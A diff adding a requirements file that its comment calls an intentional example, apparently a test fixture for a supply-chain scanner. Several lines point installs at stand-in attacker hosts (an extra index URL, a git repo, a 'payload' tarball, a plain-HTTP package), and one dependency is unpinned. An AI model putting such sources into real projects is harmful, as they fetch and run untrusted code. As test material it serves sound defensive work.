@@ -1,0 +1,6 @@
+# Intentional example — non-registry sources + an unpinned dep.
+--extra-index-url https://pypi.attacker.test/simple/
+evil-helper @ git+https://github.com/attacker/evil-helper.git@main
+https://malware.example.com/payload-1.0.tar.gz
+insecure-pkg @ http://packages.attacker.test/insecure-1.0.tar.gz
+requests
